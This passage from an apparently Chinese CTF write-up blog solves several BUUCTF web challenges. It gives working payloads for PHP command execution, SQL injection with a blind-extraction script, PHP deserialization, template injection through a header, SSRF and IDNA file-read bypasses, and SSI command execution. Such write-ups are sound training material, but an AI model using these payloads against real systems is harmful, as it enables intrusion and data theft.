id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>构造出<code>getallheaders</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dec_exec</span> = <span class="title function_ invoke__">base_convert</span>(<span class="string">&#x27;exec&#x27;</span>,<span class="number">36</span>,<span class="number">10</span>);<span class="comment">//696468</span></span><br><span class="line"><span class="variable">$dec_head</span> = <span class="title function_ invoke__">base_convert</span>(<span class="string">&#x27;getallheaders&#x27;</span>,<span class="number">30</span>,<span class="number">10</span>);<span class="comment">//8768397090111664438</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>最终<code>payload</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=$pi=base_convert,$pi(696468,10,36)(($pi(8768397090111664438,10,30))()&#123;1&#125;)</span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line">1=cat /flag</span><br></pre></td></tr></table></figure><h2 id="MRCTF2020-PYWebsite"><a href="#MRCTF2020-PYWebsite" class="headerlink" title="[MRCTF2020]PYWebsite"></a>[MRCTF2020]PYWebsite</h2><p>添加<code>XFF</code>头访问<code>/flag.php</code>即可</p><h2 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h2><p>注册账号后登录，进入广告发布页面，发现广告名字存在<code>sql注入</code>，测试后<code>payload</code>如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#列数为22</span><br><span class="line">1&#x27;/**/group/**/by/**/22,&#x27;1</span><br><span class="line">1&#x27;/**/group/**/by/**/23,&#x27;1</span><br><span class="line">#回显点为2和3</span><br><span class="line">-1&#x27;/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;&amp;&#x27;1&#x27;=&#x27;1</span><br><span class="line">#表名：ads,users</span><br><span class="line">-1&#x27;union/**/select/**/1,2,group_concat(table_name),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=database()&amp;&amp;&#x27;1&#x27;=&#x27;1</span><br><span class="line">#发现存在flag字段</span><br><span class="line">-1&#x27;/**/union/**/select/**/1,(select/**/group_concat(`2`)/**/from/**/(select/**/1,2,3/**/union/**/select/**/*/**/from/**/users)n),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;&amp;&#x27;1&#x27;=&#x27;1</span><br><span class="line">#获取flag</span><br><span class="line">-1&#x27;/**/union/**/select/**/1,(select/**/group_concat(`3`)/**/from/**/(select/**/1,2,3/**/union/**/select/**/*/**/from/**/users)n),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;&amp;&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><h2 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h2><p>源码中发现<code>&lt;a href=&quot;./time.php?source&quot;&gt;&lt;/a&gt;&lt;/p&gt;</code>，访问即可获得源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&quot;Y-m-d h:i:s&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        <span class="variable">$b</span> = <span class="variable language_">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$b</span>(<span class="variable">$a</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">HelloPhp</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="variable">$ppp</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>]);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>简单反序列化，在<code>phpinfo</code>里面搜索<code>flag</code>即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class HelloPhp</span><br><span class="line">&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;a = &quot;phpinfo();&quot;;</span><br><span class="line">        $this-&gt;b = &quot;assert&quot;;//system被ban了</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c = new HelloPhp();</span><br><span class="line">print_r(serialize($c));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><blockquote><p><strong>disable_functions：</strong></p><p>pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,scadnir,readfile,show_source,fpassthru,readdir</p></blockquote><h2 id="CISCN2019-华东南赛区-Web11"><a href="#CISCN2019-华东南赛区-Web11" class="headerlink" title="[CISCN2019 华东南赛区]Web11"></a>[CISCN2019 华东南赛区]Web11</h2><p>右上角发现<code>Current IP:</code>，添加<code>header</code>即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For: &#123;&#123;system(&#x27;cat /flag&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="极客大挑战-2019-FinalSQL"><a href="#极客大挑战-2019-FinalSQL" class="headerlink" title="[极客大挑战 2019]FinalSQL"></a>[极客大挑战 2019]FinalSQL</h2><p>用<code>burp</code>来<code>fuzz</code>下发现<code>^</code>没被<code>ban</code>，故猜测是<code>异或注入</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://764f49d1-6794-4019-82f7-ef1cdc6a8761.node4.buuoj.cn:81/search.php?id=&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">300</span>):</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span>(low &lt; high):</span><br><span class="line">        mid = (low + high) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment"># database geek</span></span><br><span class="line">        <span class="comment"># payload = &quot;1^(ord(substr((select(database())),&#123;0&#125;,1))&gt;&#123;1&#125;)^1&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment"># table F1naI1y</span></span><br><span class="line">        <span class="comment"># payload = &quot;1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;geek&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;)^1&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment"># column id,username,password</span></span><br><span class="line">        <span class="comment"># payload = &quot;1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)=&#x27;F1naI1y&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;)^1&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment"># flag </span></span><br><span class="line">        payload = <span class="string">&quot;1^(ord(substr((select(group_concat(password))from(F1naI1y)),&#123;0&#125;,1))&gt;&#123;1&#125;)^1&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">        response = requests.get(url=url+payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Click&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        time.sleep(<span class="number">0.05</span>)</span><br><span class="line">    flag += <span class="built_in">chr</span>(low)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment"># #encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">app = Flask(__name__)</span><br><span class="line"> </span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Task</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, action, param, sign, ip</span>):</span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):</span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Exec</span>(<span class="params">self</span>):</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">checkSign</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">geneSign</span>():</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge</span>():</span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;code.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scan</span>(<span class="params">param</span>):</span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSign</span>(<span class="params">action, param</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">content</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">param</span>):</span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">9999</span>)</span><br></pre></td></tr></table></figure><p>首先绕过<code>self.checkSign()</code>，并且传入的<code>action</code>需要同时包含<code>scan</code>和<code>read</code>，然后<code>if &quot;scan&quot; in self.action:</code>执行将<code>flag.txt</code>中的数据写入<code>result.txt</code>中，继续<code>if &quot;read&quot; in self.action:</code>执行读取<code>result.txt</code>中的数据，并且放在<code>result[&#39;data&#39;]</code> 中 ， <code>return json.dumps(task.Exec())  </code> 接着返回以<code>json</code>的形式返回到客户端。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#f821a364c99c7ba8e6e7017f1a64c8c6</span><br><span class="line">/geneSign?param=flag.txtread</span><br><span class="line">#&#123;&quot;code&quot;: 200, &quot;data&quot;: &quot;flag&#123;27cff900-1dbd-4895-a5d4-39c4bd09ddc2&#125;\n&quot;&#125;</span><br><span class="line">/De1ta?param=flag.txt</span><br><span class="line">Cookie:action=readscan;sign=f821a364c99c7ba8e6e7017f1a64c8c6</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://blog.csdn.net/RABCDXB/article/details/115412359">[De1CTF 2019]SSRF Me</a></p></blockquote><h2 id="BSidesCF-2019-Futurella"><a href="#BSidesCF-2019-Futurella" class="headerlink" title="[BSidesCF 2019]Futurella"></a>[BSidesCF 2019]Futurella</h2><p>查看源码即可得到<code>flag</code></p><p>直接复制粘贴文本也可</p><blockquote><p>Resistance is futile! Bring back Futurella or we’ll invade!</p><p>Also, the flag is flag{61cc71f2-8927-458f-a1a5-74a14fab8b97}</p></blockquote><h2 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h2><p>查看源码获得代码和提示</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">@app.route(&#x27;/getUrl&#x27;,</span> <span class="string">methods=[&#x27;GET&#x27;,</span> <span class="string">&#x27;POST&#x27;</span><span class="string">])</span></span><br><span class="line"><span class="string">def</span> <span class="string">getUrl():</span></span><br><span class="line">    <span class="string">url</span> <span class="string">=</span> <span class="string">request.args.get(&quot;url&quot;)</span></span><br><span class="line">    <span class="string">host</span> <span class="string">=</span> <span class="string">parse.urlparse(url).hostname</span></span><br><span class="line">    <span class="string">if</span> <span class="string">host</span> <span class="string">==</span> <span class="attr">&#x27;suctf.cc&#x27;:</span></span><br><span class="line">        <span class="string">return</span> <span class="string">&quot;我扌 your problem? 111&quot;</span></span><br><span class="line">    <span class="string">parts</span> <span class="string">=</span> <span class="string">list(urlsplit(url))</span></span><br><span class="line">    <span class="string">host</span> <span class="string">=</span> <span class="string">parts[1]</span></span><br><span class="line">    <span class="string">if</span> <span class="string">host</span> <span class="string">==</span> <span class="attr">&#x27;suctf.cc&#x27;:</span></span><br><span class="line">        <span class="string">return</span> <span class="string">&quot;我扌 your problem? 222 &quot;</span> <span class="string">+</span> <span class="string">host</span></span><br><span class="line">    <span class="string">newhost</span> <span class="string">=</span> []</span><br><span class="line">    <span class="string">for</span> <span class="string">h</span> <span class="string">in</span> <span class="string">host.split(&#x27;.&#x27;):</span></span><br><span class="line">        <span class="string">newhost.append(h.encode(&#x27;idna&#x27;).decode(&#x27;utf-8&#x27;))</span></span><br><span class="line">    <span class="string">parts[1]</span> <span class="string">=</span> <span class="string">&#x27;.&#x27;</span><span class="string">.join(newhost)</span></span><br><span class="line">    <span class="comment">#去掉 url 中的空格</span></span><br><span class="line">    <span class="string">finalUrl</span> <span class="string">=</span> <span class="string">urlunsplit(parts).split(&#x27;</span> <span class="string">&#x27;)[0]</span></span><br><span class="line"><span class="string">    host = parse.urlparse(finalUrl).hostname</span></span><br><span class="line"><span class="string">    if host == &#x27;</span><span class="string">suctf.cc&#x27;:</span></span><br><span class="line">        <span class="string">return</span> <span class="string">urllib.request.urlopen(finalUrl).read()</span></span><br><span class="line">    <span class="attr">else:</span></span><br><span class="line">        <span class="string">return</span> <span class="string">&quot;我扌 your problem? 333&quot;</span></span><br><span class="line">    <span class="string">&lt;/code&gt;</span></span><br><span class="line">    <span class="string">&lt;!--</span> <span class="string">Dont</span> <span class="string">worry</span> <span class="string">about</span> <span class="string">the</span> <span class="string">suctf.cc.</span> <span class="string">Go</span> <span class="string">on!</span> <span class="string">--&gt;</span></span><br><span class="line">    <span class="string">&lt;!--</span> <span class="string">Do</span> <span class="string">you</span> <span class="string">know</span> <span class="string">the</span> <span class="string">nginx?</span> <span class="string">--&gt;</span></span><br></pre></td></tr></table></figure><p>审计后发现<code>h.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;)</code>可以利用，使用下面的代码寻找字母替代</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_s</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>,<span class="number">65537</span>):</span><br><span class="line">        real=<span class="built_in">chr</span>(i)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            vm=real.encode(<span class="string">&#x27;idna&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;xn&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> vm:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;real:&#x27;</span>,real,<span class="string">&#x27;----&gt;&#x27;</span>,vm)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>最终<code>payload</code>如下</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#获取信息</span></span><br><span class="line">/getUrl?url=file://su%E2%93%92tf.cc/usr/local/nginx/conf/nginx.<span class="attribute">conf</span></span><br><span class="line">server &#123; <span class="attribute">listen</span> <span class="number">80</span>; <span class="section">location</span> / &#123; <span class="attribute">try_files</span> <span class="variable">$uri</span> <span class="variable">@app</span>; &#125; <span class="section">location</span> <span class="variable">@app</span> &#123; <span class="attribute">include</span> uwsgi_params; <span class="attribute">uwsgi_pass</span> unix:///tmp/uwsgi.sock; &#125; <span class="section">location</span> /static &#123; <span class="attribute">alias</span> /app/static; &#125; <span class="comment"># location /flag &#123; # alias /usr/fffffflag; # &#125; &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取flag</span></span><br><span class="line">/getUrl?url=file://su%E2%93%92tf.cc/usr/fffffflag</span><br></pre></td></tr></table></figure><h2 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h2><p>访问<code>/index.php.swp</code>获得源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ob_start</span>();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_hash</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable">$chars</span> = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;</span>;</span><br><span class="line"><span class="variable">$random</span> = <span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)];<span class="comment">//Random 5 times</span></span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">uniqid</span>().<span class="variable">$random</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">sha1</span>(<span class="variable">$content</span>); </span><br><span class="line">&#125;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">***</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) <span class="keyword">and</span> <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$admin</span> = <span class="string">&#x27;6d0bc1&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> ( <span class="variable">$admin</span> == <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]),<span class="number">0</span>,<span class="number">6</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            <span class="variable">$file_shtml</span> = <span class="string">&quot;public/&quot;</span>.<span class="title function_ invoke__">get_hash</span>().<span class="string">&quot;.shtml&quot;</span>;</span><br><span class="line">            <span class="variable">$shtml</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$file_shtml</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable to open file!&quot;</span>);</span><br><span class="line">            <span class="variable">$text</span> = <span class="string">&#x27;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Hello,&#x27;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&#x27;&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">***&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">fwrite</span>(<span class="variable">$shtml</span>,<span class="variable">$text</span>);</span><br><span class="line">            <span class="title function_ invoke__">fclose</span>(<span class="variable">$shtml</span>);</span><br><span class="line">            ***</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;[!] Header  error ...&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            </span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">***</span><br><span class="line">    &#125;</span><br><span class="line">***</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>爆破一下密码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000000</span>):</span><br><span class="line">    <span class="keyword">if</span>(md5(<span class="built_in">str</span>(i).encode()).hexdigest()[:<span class="number">6</span>] == <span class="string">&#x27;6d0bc1&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(i) <span class="comment">#2020666</span></span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>登陆后在响应包的头部发现<code>Url_is_here: public/f4c0fa112d8847a9c7b71f86ff25fa4188144c8a.shtml</code>，结合代码中<code>&lt;h1&gt;Hello,&#39;.$_POST[&#39;username&#39;].&#39;&lt;/h1&gt;</code>可知通过控制<code>username</code>的值来使<code>shtml</code>执行<code>bash</code>命令</p><blockquote><!--#include file="/home/www/user5616/nav_foot.htm"--> //可以用来读文件<!--#exec cmd="ifconfig"--> //可以用来执行命令<!--#include virtual="/includes/header.html" --> //也是读文件 与FILE不同他支持绝对路径和../来跳转到父目录 而file只能读取当前目录下的<p><a href="https://www.cnblogs.com/hookjoy/p/3650851.html">Shtml妙用</a></p></blockquote><p>最终<code>payload</code>如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#Hello,flag_990c66bf85a09c664f0b6741840499b2 index.php index.php.swp public</span><br><span class="line">password=2020666&amp;username=&lt;!--#exec cmd=&quot;ls ../&quot;--&gt;</span><br><span class="line"></span><br><span 